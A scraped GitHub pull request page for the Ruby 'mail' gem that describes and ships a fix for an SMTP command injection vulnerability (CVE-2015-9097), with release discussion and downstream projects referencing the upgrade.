=== Content from github.com_6cc410b4_20250124_124547.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmikel%2Fmail%2Fpull%2F1097)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmikel%2Fmail%2Fpull%2F1097)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=mikel%2Fmail)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mikel](/mikel)
/
**[mail](/mikel/mail)**
Public

* [Notifications](/login?return_to=%2Fmikel%2Fmail) You must be signed in to change notification settings
* [Fork
  939](/login?return_to=%2Fmikel%2Fmail)
* [Star
   3.6k](/login?return_to=%2Fmikel%2Fmail)

* [Code](/mikel/mail)
* [Issues
  116](/mikel/mail/issues)
* [Pull requests
  52](/mikel/mail/pulls)
* [Actions](/mikel/mail/actions)
* [Projects
  0](/mikel/mail/projects)
* [Wiki](/mikel/mail/wiki)
* [Security](/mikel/mail/security)
* [Insights](/mikel/mail/pulse)

Additional navigation options

* [Code](/mikel/mail)
* [Issues](/mikel/mail/issues)
* [Pull requests](/mikel/mail/pulls)
* [Actions](/mikel/mail/actions)
* [Projects](/mikel/mail/projects)
* [Wiki](/mikel/mail/wiki)
* [Security](/mikel/mail/security)
* [Insights](/mikel/mail/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fmikel%2Fmail%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fmikel%2Fmail%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# CVE-2015-9097: prevent SMTP command injection via To/From addresses #1097

 Closed

[jeremy](/jeremy)
wants to merge
1
commit into
[mikel:master](/mikel/mail/tree/master "mikel/mail:master")
from
[jeremy:security/smtp-injection](/jeremy/mail/tree/security/smtp-injection "jeremy/mail:security/smtp-injection")

 Closed

# [CVE-2015-9097: prevent SMTP command injection via To/From addresses](#top) #1097

[jeremy](/jeremy)
wants to merge
1
commit into
[mikel:master](/mikel/mail/tree/master "mikel/mail:master")
from
[jeremy:security/smtp-injection](/jeremy/mail/tree/security/smtp-injection "jeremy/mail:security/smtp-injection")

[Conversation
4](/mikel/mail/pull/1097)
[Commits
1](/mikel/mail/pull/1097/commits)
[Checks
0](/mikel/mail/pull/1097/checks)
[Files changed](/mikel/mail/pull/1097/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![jeremy](https://avatars.githubusercontent.com/u/199?s=60&v=4)](/jeremy)

Copy link

Collaborator

### @jeremy **[jeremy](/jeremy)** commented [May 9, 2017](#issue-227235015) ‚Ä¢ edited Loading

Validate addresses passed as SMTP command arguments to prevent

injection of other SMTP commands. Disallow line breaks and very

long addresses which may cause overflows on some old SMTP servers.

Ruby 2.4 Net::SMTP already disallows addresses that contain newlines.

Enforce this validation in Mail to cover older Ruby versions and

other SMTP implementations that don't validate input.

SMTP injection whitepaper: <http://www.mbsd.jp/Whitepaper/smtpi.pdf>

Ruby security report: <https://hackerone.com/reports/137631>

OSVDB entry: <https://rubysec.com/advisories/mail-OSVDB-131677>

Sorry, something went wrong.

All reactions

[![@jeremy](https://avatars.githubusercontent.com/u/199?s=40&u=7131f4a48ae5754664b31b0894a7d9d3c9ffc07b&v=4)](/jeremy)
[jeremy](/jeremy)
added this to the [2.7.0](/mikel/mail/milestone/5) milestone
[May 9, 2017](#event-1073862431)

 [![@jeremy](https://avatars.githubusercontent.com/u/199?s=40&u=7131f4a48ae5754664b31b0894a7d9d3c9ffc07b&v=4)](/jeremy)
[jeremy](/jeremy)
[force-pushed](/mikel/mail/compare/7c2bc7680d9f077bf1f2a0f26117ef70198c7fe9..6671495e3313f43f844e67170da7e62e62baf9d3)
the
security/smtp-injection

branch
from
[`7c2bc76`](/mikel/mail/commit/7c2bc7680d9f077bf1f2a0f26117ef70198c7fe9) to
[`6671495`](/mikel/mail/commit/6671495e3313f43f844e67170da7e62e62baf9d3)  [Compare](/mikel/mail/compare/7c2bc7680d9f077bf1f2a0f26117ef70198c7fe9..6671495e3313f43f844e67170da7e62e62baf9d3)
[May 9, 2017 03:47](#event-1073897413)

[![@jeremy](https://avatars.githubusercontent.com/u/199?s=40&v=4)](/jeremy)

`[SMTP security: prevent command injection via To/From addresses](/mikel/mail/pull/1097/commits/31c6ca49ba3d991fe94c50a467889d4077f30b44 "SMTP security: prevent command injection via To/From addresses

Validate addresses passed as SMTP command arguments to prevent
injection of other SMTP commands. Disallow line breaks and very
long addresses which may cause overflows on some old SMTP servers.

Ruby 2.4 Net::SMTP already disallows addresses that contain newlines.
Enforce this validation in Mail to cover older Ruby versions and
other SMTP implementations that don't validate input.

SMTP injection whitepaper: http://www.mbsd.jp/Whitepaper/smtpi.pdf
Ruby security report: https://hackerone.com/reports/137631
OSVDB entry: https://rubysec.com/advisories/mail-OSVDB-131677")`
 ‚Ä¶

`[31c6ca4](/mikel/mail/pull/1097/commits/31c6ca49ba3d991fe94c50a467889d4077f30b44)`

```
Validate addresses passed as SMTP command arguments to prevent
injection of other SMTP commands. Disallow line breaks and very
long addresses which may cause overflows on some old SMTP servers.

Ruby 2.4 Net::SMTP already disallows addresses that contain newlines.
Enforce this validation in Mail to cover older Ruby versions and
other SMTP implementations that don't validate input.

SMTP injection whitepaper: <http://www.mbsd.jp/Whitepaper/smtpi.pdf>
Ruby security report: <https://hackerone.com/reports/137631>
OSVDB entry: <https://rubysec.com/advisories/mail-OSVDB-131677>
```

 [![@jeremy](https://avatars.githubusercontent.com/u/199?s=40&u=7131f4a48ae5754664b31b0894a7d9d3c9ffc07b&v=4)](/jeremy)
[jeremy](/jeremy)
[force-pushed](/mikel/mail/compare/6671495e3313f43f844e67170da7e62e62baf9d3..31c6ca49ba3d991fe94c50a467889d4077f30b44)
the
security/smtp-injection

branch
from
[`6671495`](/mikel/mail/commit/6671495e3313f43f844e67170da7e62e62baf9d3) to
[`31c6ca4`](/mikel/mail/commit/31c6ca49ba3d991fe94c50a467889d4077f30b44)  [Compare](/mikel/mail/compare/6671495e3313f43f844e67170da7e62e62baf9d3..31c6ca49ba3d991fe94c50a467889d4077f30b44)
[May 9, 2017 04:00](#event-1073905954)

This was referenced May 9, 2017

[2.6.x SMTP security: prevent command injection via To/From addresses
#1098](/mikel/mail/pull/1098)
 Closed

[2.5.x SMTP security: prevent command injection via To/From addresses
#1099](/mikel/mail/pull/1099)
 Closed

[![@jeremy](https://avatars.githubusercontent.com/u/199?s=40&u=7131f4a48ae5754664b31b0894a7d9d3c9ffc07b&v=4)](/jeremy)
[jeremy](/jeremy)
closed this
in
`[cfff6c8](/mikel/mail/commit/cfff6c866bda6485210d304f72293c29f6045e81)`
[May 9, 2017](#event-1073922338)

 [![@jeremy](https://avatars.githubusercontent.com/u/199?s=40&u=7131f4a48ae5754664b31b0894a7d9d3c9ffc07b&v=4)](/jeremy)
[jeremy](/jeremy)
deleted the
security/smtp-injection

branch
[May 9, 2017 04:25](#event-1073922530)

This was referenced May 9, 2017

[Need patch for OSVDB-131677 against 2.5.x
#944](/mikel/mail/issues/944)

Closed

[Add advisory for SMTP injection vulnerability in mail <2.6.0
rubysec/ruby-advisory-db#215](/rubysec/ruby-advisory-db/issues/215)

Closed

[buren](/buren)
added a commit
to justarrived/just\_match\_api
that referenced
this pull request
[May 10, 2017](#ref-commit-11bf980)
[![@buren](https://avatars.githubusercontent.com/u/922411?s=40&u=8eda2c059c3933f823219afb833ea3c3acbb355a&v=4)](/buren)

`[Update gems: mail (fixed Security advisory:](/justarrived/just_match_api/commit/11bf9800eb3253fa9e3b106a2bea4e4ab9db426c "Update gems: mail (fixed Security advisory: https://github.com/mikel/mail/pull/1097)") [mikel/mail#1097](https://github.com/mikel/mail/pull/1097)[)](/justarrived/just_match_api/commit/11bf9800eb3253fa9e3b106a2bea4e4ab9db426c "Update gems: mail (fixed Security advisory: https://github.com/mikel/mail/pull/1097)")`

`[11bf980](/justarrived/just_match_api/commit/11bf9800eb3253fa9e3b106a2bea4e4ab9db426c)`

[![@jordan-brough](https://avatars.githubusercontent.com/u/23050?s=80&u=6ceb62c774ac06be1f3bb7d319ac90316aaad50c&v=4)](/jordan-brough)

Copy link

### **[jordan-brough](/jordan-brough)** commented [May 11, 2017](#issuecomment-300848264)

| [@jeremy](https://github.com/jeremy) when might we expect an official 2.6.6 release for this? Currently I only see a `2.6.6.rc1` on rubygems. |
| --- |

All reactions

Sorry, something went wrong.

[![@jeremy](https://avatars.githubusercontent.com/u/199?s=80&u=7131f4a48ae5754664b31b0894a7d9d3c9ffc07b&v=4)](/jeremy)

Copy link

Collaborator

Author

### **[jeremy](/jeremy)** commented [May 15, 2017](#issuecomment-301380415)

| [@jordan-brough](https://github.com/jordan-brough) Expect an official 2.6.6 after RC1 has had a fair number of installs to shake out regressions. Note than 2.6.x is (coincidentally) not vulnerable to this issue, thanks to [#505](https://github.com/mikel/mail/pull/505) stripping CRLF from header values. |
| --- |

All reactions

Sorry, something went wrong.

[amatriain](/amatriain)
added a commit
to amatriain/feedbunch
that referenced
this pull request
[May 15, 2017](#ref-commit-0471094)
[![@amatriain](https://avatars.githubusercontent.com/u/1439986?s=40&v=4)](/amatriain)

`[Pin mail gem to version 2.6.6.rc1](/amatriain/feedbunch/commit/0471094a7d698f530316ffbfda6489a6a5170db8 "Pin mail gem to version 2.6.6.rc1

This fixes a vulnerability that allows users to send spam from any form
that allows email input (e.g. signup).

For more about the vulnerability see:

https://github.com/mikel/mail/pull/1097

When implicit dependency resolution in Gemfile.lock resolves to a
released mail version that includes the fix, the explicit dependency in
Gemfile will be removed.")`
‚Ä¶

`[0471094](/amatriain/feedbunch/commit/0471094a7d698f530316ffbfda6489a6a5170db8)`

```
This fixes a vulnerability that allows users to send spam from any form
that allows email input (e.g. signup).

For more about the vulnerability see:

[mikel/mail#1097](https://github.com/mikel/mail/pull/1097)

When implicit dependency resolution in Gemfile.lock resolves to a
released mail version that includes the fix, the explicit dependency in
Gemfile will be removed.
```

[![@david-a-wheeler](https://avatars.githubusercontent.com/u/813150?s=40&v=4)](/david-a-wheeler)
[david-a-wheeler](/david-a-wheeler)
mentioned this pull request
[May 30, 2017](#ref-issue-232290048)

[Please release versions with security fix OSVDB-131677
#1116](/mikel/mail/issues/1116)

Closed

[drewda](/drewda)
added a commit
to transitland/transitland-datastore
that referenced
this pull request
[Jun 1, 2017](#ref-commit-b7cd327)
[![@drewda](https://avatars.githubusercontent.com/u/212369?s=40&u=442dc2a2971099d2fd1b2846896d965b1f0138c0&v=4)](/drewda)

`[updating gems & pegging mail gem to address security vunerability](/transitland/transitland-datastore/commit/b7cd32758c6e7ed7eab9eeceba546c24f8196160 "updating gems & pegging `mail` gem to address security vunerability

see https://github.com/mikel/mail/pull/1097

TODO: remove once https://github.com/mikel/mail/issues/1116 is addressed")`
‚Ä¶

`[b7cd327](/transitland/transitland-datastore/commit/b7cd32758c6e7ed7eab9eeceba546c24f8196160)`

```
see [mikel/mail#1097](https://github.com/mikel/mail/pull/1097)

TODO: remove once [mikel/mail#1116](https://github.com/mikel/mail/issues/1116) is addressed
```

[![@drewda](https://avatars.githubusercontent.com/u/212369?s=40&u=442dc2a2971099d2fd1b2846896d965b1f0138c0&v=4)](/drewda)
[drewda](/drewda)
mentioned this pull request
[Jun 1, 2017](#ref-pullrequest-232922496)

[updating gems & pegging `mail` gem to address security vulnerability
transitland/transitland-datastore#1108](/transitland/transitland-datastore/pull/1108)
 Merged

[![@stvnrlly](https://avatars.githubusercontent.com/u/4156602?s=40&v=4)](/stvnrlly)
[stvnrlly](/stvnrlly)
mentioned this pull request
[Jun 1, 2017](#ref-issue-232974803)

[Actionmailer security issue
18F/micropurchase#1524](/18F/micropurchase/issues/1524)

Open

[eviltrout](/eviltrout)
added a commit
to discourse/discourse
that referenced
this pull request
[Jun 1, 2017](#ref-commit-19d5eb9)
[![@eviltrout](https://avatars.githubusercontent.com/u/17538?s=40&v=4)](/eviltrout)

`[SECURITY: Vunerability in mail gem](/discourse/discourse/commit/19d5eb903cdb4f17109abfa03901c20ab7e6a6ce "SECURITY: Vunerability in mail gem

(see https://github.com/mikel/mail/pull/1097)")`
‚Ä¶

`[19d5eb9](/discourse/discourse/commit/19d5eb903cdb4f17109abfa03901c20ab7e6a6ce)`

```
(see [mikel/mail#1097](https://github.com/mikel/mail/pull/1097))
```

[eviltrout](/eviltrout)
added a commit
to discourse/discourse
that referenced
this pull request
[Jun 1, 2017](#ref-commit-0eaa6de)
[![@eviltrout](https://avatars.githubusercontent.com/u/17538?s=40&v=4)](/eviltrout)

`[SECURITY: Vunerability in mail gem](/discourse/discourse/commit/0eaa6defa09193d16d4bbc5643e3b453f737365c "SECURITY: Vunerability in mail gem

(see https://github.com/mikel/mail/pull/1097)")`
‚Ä¶

`[0eaa6de](/discourse/discourse/commit/0eaa6defa09193d16d4bbc5643e3b453f737365c)`

```
(see [mikel/mail#1097](https://github.com/mikel/mail/pull/1097))
```

[eviltrout](/eviltrout)
added a commit
to discourse/discourse
that referenced
this pull request
[Jun 1, 2017](#ref-commit-d46f98a)
[![@eviltrout](https://avatars.githubusercontent.com/u/17538?s=40&v=4)](/eviltrout)

`[SECURITY: Vunerability in mail gem](/discourse/discourse/commit/d46f98a8d5fc0f98244199fade2421a8942a0692 "SECURITY: Vunerability in mail gem

(see https://github.com/mikel/mail/pull/1097)")`
‚Ä¶

`[d46f98a](/discourse/discourse/commit/d46f98a8d5fc0f98244199fade2421a8942a0692)`

```
(see [mikel/mail#1097](https://github.com/mikel/mail/pull/1097))
```

[![@varyonic](https://avatars.githubusercontent.com/u/780081?s=80&v=4)](/varyonic)

Copy link

### **[varyonic](/varyonic)** commented [Jun 8, 2017](#issuecomment-307200092) ‚Ä¢ edited Loading

| One month and >10,000 downloads for 2.6.6.rc1. |
| --- |

 üéâ
1
 jeremy reacted with hooray emoji

All reactions

* üéâ
  1 reaction

Sorry, something went wrong.

[![@jeremy](https://avatars.githubusercontent.com/u/199?s=80&u=7131f4a48ae5754664b31b0894a7d9d3c9ffc07b&v=4)](/jeremy)

Copy link

Collaborator

Author

### **[jeremy](/jeremy)** commented [Jun 9, 2017](#issuecomment-307501415) ‚Ä¢ edited Loading

| Mail [2.5.5](https://rubygems.org/gems/mail/versions/2.5.5) ([tag](https://github.com/mikel/mail/releases/tag/2.5.5)) and [2.6.6](https://rubygems.org/gems/mail/versions/2.6.6) ([tag](https://github.com/mikel/mail/releases/tag/2.6.6)) are released. |
| --- |

All reactions

Sorry, something went wrong.

[ylansegal](/ylansegal)
added a commit
to ylansegal/tokenator
that referenced
this pull request
[Jun 9, 2017](#ref-commit-f690c40)
[![@ylansegal](https://avatars.githubusercontent.com/u/561180?s=40&v=4)](/ylansegal)

`[Upgrade mail gem to address security vulnerability...](/ylansegal/tokenator/commit/f690c40a3f62a4d90c532a8d851aa19b8a84e7a4 "Upgrade mail gem to address security vulnerability...

https://github.com/mikel/mail/pull/1097")`
‚Ä¶

`[f690c40](/ylansegal/tokenator/commit/f690c40a3f62a4d90c532a8d851aa19b8a84e7a4)`

```
[mikel/mail#1097](https://github.com/mikel/mail/pull/1097)
```

[![@cjlarose](https://avatars.githubusercontent.com/u/954763?s=40&v=4)](/cjlarose)
[cjlarose](/cjlarose)
mentioned this pull request
[Jun 10, 2017](#ref-pullrequest-234965021)

[Update patched versions for mail gem vulnerability OSVDB-131677
rubysec/ruby-advisory-db#292](/rubysec/ruby-advisory-db/pull/292)
 Merged

[jeremyolliver](/jeremyolliver)
added a commit
to jeremyolliver/ruby-advisory-db
that referenced
this pull request
[Jun 12, 2017](#ref-commit-acdb140)
[![@jeremyolliver](https://avatars.githubusercontent.com/u/14826?s=40&v=4)](/jeremyolliver)

`[Update patched versions for 2.5.X and 2.6.X+ series](/jeremyolliver/ruby-advisory-db/commit/acdb140d56b405abdf5397033827ee9c712a241d "Update patched versions for 2.5.X and 2.6.X+ series

As per comment https://github.com/mikel/mail/pull/1097#issuecomment-307501415
versions 2.5.5 and 2.6.6 include patches for this issue, 2.6.0 to 2.6.5 do not

mikel/mail 2-6-stable branch fixes in commit 37908c37dfb26ea262d0fa7916cd9bbee3750e63
mikel/mail 2-5-stable branch fixes in commit f4239e4cc03d982219a6fa58e059d8758bbd2d8f")`
‚Ä¶

`[acdb140](/jeremyolliver/ruby-advisory-db/commit/acdb140d56b405abdf5397033827ee9c712a241d)`

```
As per comment [mikel/mail#1097 (comment)](https://github.com/mikel/mail/pull/1097#issuecomment-307501415)
versions 2.5.5 and 2.6.6 include patches for this issue, 2.6.0 to 2.6.5 do not

mikel/mail 2-6-stable branch fixes in commit 37908c37dfb26ea262d0fa7916cd9bbee3750e63
mikel/mail 2-5-stable branch fixes in commit f4239e4cc03d982219a6fa58e059d8758bbd2d8f
```

[![@jeremy](https://avatars.githubusercontent.com/u/199?s=40&u=7131f4a48ae5754664b31b0894a7d9d3c9ffc07b&v=4)](/jeremy)
[jeremy](/jeremy)
changed the title
~~SMTP security: prevent command injection via To/From addresses~~
CVE-2015-9097: prevent SMTP command injection via To/From addresses
[Jun 13, 2017](#event-1120605826)

[ulferts](/ulferts)
added a commit
to opf/openproject
that referenced
this pull request
[Jun 13, 2017](#ref-commit-c6d36c3)
[![@ulferts](https://avatars.githubusercontent.com/u/617519?s=40&v=4)](/ulferts)

`[bump mail to get rid of gemnasium security warning](/opf/openproject/commit/c6d36c3ab8ca1b654db19b52cb0464e724ffd9b3 "bump mail to get rid of gemnasium security warning

OP is not affected by the vulnerability as:
* We limit the length of mail fields
* 2.6.x is not vulnerable at all (https://github.com/mikel/mail/pull/1097#issuecomment-301380415)

But gemnasium complains and this produces a red badge which looks bad.

The rc has been around for some time now, so it should be stable enough.

I expect to bump the version once the official 2.6.6 has been released.")`
‚Ä¶

`[c6d36c3](/opf/openproject/commit/c6d36c3ab8ca1b654db19b52cb0464e724ffd9b3)`

```
OP is not affected by the vulnerability as:
* We limit the length of mail fields
* 2.6.x is not vulnerable at all ([mikel/mail#1097 (comment)](https://github.com/mikel/mail/pull/1097#issuecomment-301380415))

But gemnasium complains and this produces a red badge which looks bad.

The rc has been around for some time now, so it should be stable enough.

I expect to bump the version once the official 2.6.6 has been released.
```

[![@ulferts](https://avatars.githubusercontent.com/u/617519?s=40&v=4)](/ulferts)
[ulferts](/ulferts)
mentioned this pull request
[Jun 13, 2017](#ref-pullrequest-235488249)

[bump mail to get rid of gemnasium security warning
opf/openproject#5643](/opf/openproject/pull/5643)
 Merged

[oliverguenther](/oliverguenther)
pushed a commit
to opf/openproject
that referenced
this pull request
[Jun 14, 2017](#ref-commit-f5ce00b)
[![@ulferts](https://avatars.githubusercontent.com/u/617519?s=40&v=4)](/ulferts) [![@oliverguenther](https://avatars.githubusercontent.com/u/459462?s=40&v=4)](/oliverguenther)

`[bump mail to get rid of gemnasium security warning (](/opf/openproject/commit/f5ce00bafc463125a93bbda20d5a992826ac67c7 "bump mail to get rid of gemnasium security warning (#5643)

OP is not affected by the vulnerability as:
* We limit the length of mail fields
* 2.6.x is not vulnerable at all (https://github.com/mikel/mail/pull/1097#issuecomment-301380415)

But gemnasium complains and this produces a red badge which looks bad.

The rc has been around for some time now, so it should be stable enough.

I expect to bump the version once the official 2.6.6 has been released.
[ci skip]")[#5643](https://github.com/opf/openproject/pull/5643)[)](/opf/openproject/commit/f5ce00bafc463125a93bbda20d5a992826ac67c7 "bump mail to get rid of gemnasium security warning (#5643)

OP is not affected by the vulnerability as:
* We limit the length of mail fields
* 2.6.x is not vulnerable at all (https://github.com/mikel/mail/pull/1097#issuecomment-301380415)

But gemnasium complains and this produces a red badge which looks bad.

The rc has been around for some time now, so it should be stable enough.

I expect to bump the version once the official 2.6.6 has been released.
[ci skip]")`
‚Ä¶

`[f5ce00b](/opf/openproject/commit/f5ce00bafc463125a93bbda20d5a992826ac67c7)`

```
OP is not affected by the vulnerability as:
* We limit the length of mail fields
* 2.6.x is not vulnerable at all ([mikel/mail#1097 (comment)](https://github.com/mikel/mail/pull/1097#issuecomment-301380415))

But gemnasium complains and this produces a red badge which looks bad.

The rc has been around for some time now, so it should be stable enough.

I expect to bump the version once the official 2.6.6 has been released.
[ci skip]
```

[![@buzztaiki](https://avatars.githubusercontent.com/u/30734?s=40&v=4)](/buzztaiki)
[buzztaiki](/buzztaiki)
mentioned this pull request
[Jun 17, 2017](#ref-issue-236676053)

[bundle exec rake fails if mail gem >= 2.6.6
ryanb/letter\_opener#144](/ryanb/letter_opener/issues/144)

Closed

[![@artur-intech](https://avatars.githubusercontent.com/u/22315378?s=40&v=4)](/artur-intech)
[artur-intech](/artur-intech)
mentioned this pull request
[Sep 27, 2017](#ref-pullrequest-260955341)

[Update mail gem to 2.6.6
internetee/registry#596](/internetee/registry/pull/596)
 Merged

[boltronics](/boltronics)
pushed a commit
to sitepoint/discourse
that referenced
this pull request
[Oct 10, 2017](#ref-commit-09d84e8)
[![@eviltrout](https://avatars.githubusercontent.com/u/17538?s=40&v=4)](/eviltrout) [![@boltronics](https://avatars.githubusercontent.com/u/250531?s=40&v=4)](/boltronics)

`[SECURITY: Vunerability in mail gem](/sitepoint/discourse/commit/09d84e8154a78a3bdd3adc5dfb75121b849999f1 "SECURITY: Vunerability in mail gem

(see https://github.com/mikel/mail/pull/1097)")`
‚Ä¶

`[09d84e8](/sitepoint/discourse/commit/09d84e8154a78a3bdd3adc5dfb75121b849999f1)`

```
(see [mikel/mail#1097](https://github.com/mikel/mail/pull/1097))
```

[![@jzruscio](https://avatars.githubusercontent.com/u/141532?s=40&v=4)](/jzruscio)
[jzruscio](/jzruscio)
mentioned this pull request
[Oct 16, 2017](#ref-pullrequest-265940696)

[upgrade mail to at least 2.5.5
rails/rails#30905](/rails/rails/pull/30905)
 Closed

[thegcat](/thegcat)
pushed a commit
to planio-gmbh/mail
that referenced
this pull request
[Jan 26, 2018](#ref-commit-4f7eba4)

`[Merge tag '2.6.6' into 2-6-stable](/planio-gmbh/mail/commit/4f7eba43f5d21786e742da83349440a149f12a41 "Merge tag '2.6.6' into 2-6-stable

Mail 2.6.6

Security:
* #1097 ‚Äì SMTP security: prevent command injection via To/From addresses. (jeremy)

Bugs:
* #689 - Fix Exim delivery method broken by #477 in 2.5.4. (jethrogb)")`
‚Ä¶

`[4f7eba4](/planio-gmbh/mail/commit/4f7eba43f5d21786e742da83349440a149f12a41)`

```
Mail 2.6.6

Security:
* [mikel#1097](https://github.com/mikel/mail/pull/1097) ‚Äì SMTP security: prevent command injection via To/From addresses. (jeremy)

Bugs:
* [mikel#689](https://github.com/mikel/mail/pull/689) - Fix Exim delivery method broken by [mikel#477](https://github.com/mikel/mail/pull/477) in 2.5.4. (jethrogb)
```

This was referenced Mar 12, 2021

[Bump mail from 2.5.4 to 2.5.5
guigoalmeida/Diary#1](/guigoalmeida/Diary/pull/1)
 Open

[Bump mail from 2.5.4 to 2.5.5
dhes/pop\_man#1](/dhes/pop_man/pull/1)
 Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fmikel%2Fmail%2Fpull%2F1097)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

 [**2.7.0**](/mikel/mail/milestone/5 "2.7.0")

Development

Successfully merging this pull request may close these issues.

3 participants

[![@jeremy](https://avatars.githubusercontent.com/u/199?s=52&v=4)](/jeremy) [![@jordan-brough](https://avatars.githubusercontent.com/u/23050?s=52&v=4)](/jordan-brough) [![@varyonic](https://avatars.githubusercontent.com/u/780081?s=52&v=4)](/varyonic)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_3a9e64a2_20250124_124548.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frubysec%2Fruby-advisory-db%2Fissues%2F215)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
